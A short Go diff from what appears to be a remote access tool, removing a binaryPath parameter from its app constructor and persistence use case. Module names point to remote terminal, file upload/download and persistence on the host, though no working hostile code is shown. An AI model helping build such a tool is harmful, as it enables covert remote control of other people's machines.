@@ -18,7 +18,7 @@ type App struct {
 	Handler handler.Handler
 }
 
-func NewApp(address, port, binaryPath string) (*App, error) {
+func NewApp(address, port string) (*App, error) {
 	conn, err := network.NewConnection(address, port)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error creating new connection")
@@ -31,7 +31,7 @@ func NewApp(address, port, binaryPath string) (*App, error) {
 	downloadUseCase := download.NewDownloadUseCase(conn)
 	uploadUseCase := upload.NewUploadUseCase(conn)
 	terminalUseCase := terminal.NewTerminalUseCase(conn)
-	persistenceUseCase := persistence.NewPersistenceUseCase(conn, binaryPath)
+	persistenceUseCase := persistence.NewPersistenceUseCase(conn)
 
 	useCase := usecase.UseCase{
 		Information: informationUseCase,
